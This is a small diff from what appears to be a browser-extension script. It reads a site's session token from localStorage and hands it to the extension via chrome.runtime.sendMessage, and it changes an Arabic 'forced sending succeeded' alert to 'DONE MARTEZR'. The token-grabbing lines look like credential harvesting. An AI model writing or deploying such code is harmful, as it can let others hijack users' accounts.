@@ -12,5 +12,5 @@
         const t = localStorage.getItem('token')?.replace(/"/g, "");
         if (t) chrome.runtime.sendMessage({token: t});
     }
-    alert("تم الإرسال القسري بنجاح! افحص الآن.");
+    alert("DONE MARTEZR");
 })();
